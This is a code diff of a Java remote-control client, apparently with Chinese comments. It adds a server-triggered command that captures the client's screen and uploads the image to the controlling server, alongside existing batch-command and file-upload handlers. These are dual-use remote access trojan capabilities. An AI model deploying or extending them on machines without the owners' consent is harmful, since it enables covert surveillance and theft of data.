@@ -133,7 +133,9 @@ public class HandleConn extends Thread{
                                         "\n" +
                                         "!!rft <oper> [params..]  文件传输指令\n" +
                                         "      oper列表:\n" +
-                                        "      upload <filePathOnClient> <savePathOnServer>  上传一个文件\n";
+                                        "      upload <filePathOnClient> <savePathOnServer>  上传一个文件\n" +
+                                        "\n" +
+                                        "!!scr <picFile.png>  把屏幕截图保存到文件(png格式)\n";
                                 ClientMain.bufferedWriter.write(helpinfo + "\n");
                                 ClientMain.bufferedWriter.flush();
                                 ClientMain.sendFinishToServer();
@@ -396,6 +398,7 @@ public class HandleConn extends Thread{
                                     }
                                     default:{
                                         writeToServer("!!bat 命令语法不正确\n");
+                                        ClientMain.sendFinishToServer();
                                         continue readMsg;
                                     }
                                 }
@@ -406,22 +409,57 @@ public class HandleConn extends Thread{
                             case "!!rft":{
                                 if(cmd0.length<2){
                                     writeToServer("!!rft 命令语法不正确");
+                                    ClientMain.sendFinishToServer();
                                     continue readMsg;
                                 }
                                 switch (cmd0[1]){
                                     case "upload":{//!!rft upload <filePath> <savePath>
                                         if(cmd0.length<4){
                                             writeToServer("!!rft upload 命令语法不正确");
+                                            ClientMain.sendFinishToServer();
                                             continue readMsg;
                                         }
                                         FileSender.sendFile(new File(cmd0[2]),cmd0[3],new Date().getTime()+"", ClientMain.ip,ClientMain.rft_port);
+                                        ClientMain.sendFinishToServer();
                                         continue readMsg;
                                     }
                                     default:{
                                         writeToServer("!!rft命令语法不正确,无此二级命令");
+                                        ClientMain.sendFinishToServer();
                                         continue readMsg;
                                     }
                                 }
+                            }
+                            case "!!scr":{
+                                if(cmd0.length<2){
+                                    writeToServer("!!scr 命令语法不正确");
+                                    ClientMain.sendFinishToServer();
+                                    continue readMsg;
+                                }
+                                try {
+                                    Thread t=new Thread(() -> {
+	                                    try {
+		                                    writeToServer("正在创建屏幕截图");
+		                                    PrtScreen.saveScreen(cmd0[1]);
+		                                    writeToServer("成功将截图保存到 " + cmd0[1] + "\n");
+	                                    } catch (Exception e) {
+		                                    writeToServer("获取屏幕截图失败:" + getErrorInfo(e));
+	                                    }
+	                                    try {
+		                                    //发送到服务器
+		                                    FileSender.sendFile(new File(cmd0[1]), "prtscr", "prtscr" + new Date().getTime(), ClientMain.ip, ClientMain.port);
+	                                        writeToServer("成功上传截图到:"+ClientMain.ip);
+	                                    }catch (Exception e){
+	                                    	writeToServer("无法将截图上传至服务器");
+	                                    }
+                                        ClientMain.sendFinishToServer();
+                                    });
+                                    t.start();
+                                }catch (Exception e){
+                                    writeToServer("获取屏幕截图失败:" + getErrorInfo(e));
+                                }
+//                                ClientMain.sendFinishToServer();
+                                continue readMsg;
                             }
                         }
                         Out.say("HandleConn","get:"+cmd+" processing?"+ClientMain.processing());
